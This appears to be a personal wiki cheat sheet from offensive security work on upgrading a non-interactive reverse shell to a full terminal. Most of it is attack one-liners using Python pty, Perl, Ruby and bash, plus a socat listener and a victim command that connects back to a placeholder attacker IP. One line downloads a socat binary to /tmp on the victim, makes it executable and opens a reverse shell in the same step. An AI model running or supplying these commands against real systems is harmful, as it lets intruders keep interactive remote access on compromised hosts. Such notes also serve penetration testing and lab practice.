Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-10-14T16:39:05-05:00

====== Upgrading shells ======
Created Thursday 14 October 2021

===== Upgrading a dumb shell to full tty: =====
Because a "normal" reverse shell is a non-interactive shell, we won't be able to run programs that require interaction. The reason for this is that we can give it input, but we won't be able to see the output, because
the output is redirected to STDOUT, which is something else than our output stream.

Use these oneliners to upgrade a non-interactive shell to a functional one

===== Python > Half interactive =====
{{{code: lang="python3" linenumbers="False"
python -c 'import pty; pty.spawn("/bin/bash")'
}}}

=== Drawbacks ===
* No access to STDERR
* No tab completion
* No history browsing
* Terminal closes on CTRL+C

Upgrading a python shell to a fully interactive shell


===== Socat > Fully interactive reverse shell =====
{{{code: lang="sh" linenumbers="True"
#Listener (attacker):
socat file:`tty`,raw,echo=0 tcp-listen:<port>

#Victim (Connecting back to attacker):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_ip>:<port>
}}}

* If the victim host has internet access, but no socat: use this oneline to download, and execute in one go:
* This is for a Linux x86_64 system
{{{code: lang="sh" linenumbers="False"
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker ip>:<port>
}}}

=== Drawbacks ===
* socat is not installed on most systems by default
* Requires some tranfer-foo if host is has no access to public internet


===== PERL > Half interactive =====
{{{code: lang="sh" linenumbers="False"
perl -e 'exec "/bin/sh";'
}}}

==== Drawbacks ====
* Does not seem to work often

===== RUBY > Half interactive =====
{{{code: lang="sh" linenumbers="False"
ruby -e 'exec "/bin/sh";'
}}}

==== Drawbacks ====
* Does not seem to work often


==== BASH > Unkown ====
{{{code: lang="sh" linenumbers="False"
bash -i
}}}

=== Drawbacks ===
* Appears to open an interactive shell on the server, rather than the client

